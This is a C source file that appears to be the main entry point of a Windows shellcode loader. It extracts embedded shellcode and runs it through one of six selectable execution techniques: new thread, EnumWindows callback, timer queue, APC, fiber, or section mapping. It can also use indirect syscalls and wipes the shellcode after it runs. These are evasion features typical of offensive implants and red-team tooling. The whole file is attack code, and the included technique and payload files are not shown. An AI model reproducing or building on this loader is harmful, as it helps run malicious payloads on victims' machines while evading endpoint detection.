#include "config.h"
#include <stdlib.h>
#include <string.h>
#include "dispatch.h"
#include "payload.h"
#include "techniques.h"
#if USE_INDIRECT_SYSCALLS
#include "syscalls.h"
#endif

static technique_t techniques[] = {
    { "createthread",  tech_createthread },
    { "enum_windows",  tech_enum_windows },
    { "timer_queue",   tech_timer_queue  },
    { "apc_self",      tech_apc_self     },
    { "fiber",         tech_fiber        },
    { "section_map",   tech_section_map  },
};

#define NUM_TECHNIQUES (sizeof(techniques) / sizeof(techniques[0]))

int main(int argc, char **argv) {
    int tech_idx = DEFAULT_TECHNIQUE;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0 && i + 1 < argc)
            tech_idx = atoi(argv[++i]);
    }

    if (tech_idx < 0 || tech_idx >= (int)NUM_TECHNIQUES)
        return 1;

#if USE_INDIRECT_SYSCALLS
    syscalls_init();
#endif

    size_t sc_len = 0;
    unsigned char *sc = ldr_extract_shellcode(&sc_len);
    if (!sc || sc_len == 0)
        return 1;

    BOOL ok = techniques[tech_idx].fn(sc, sc_len);

    ldr_wipe(sc, sc_len);
    return ok ? 0 : 1;
}
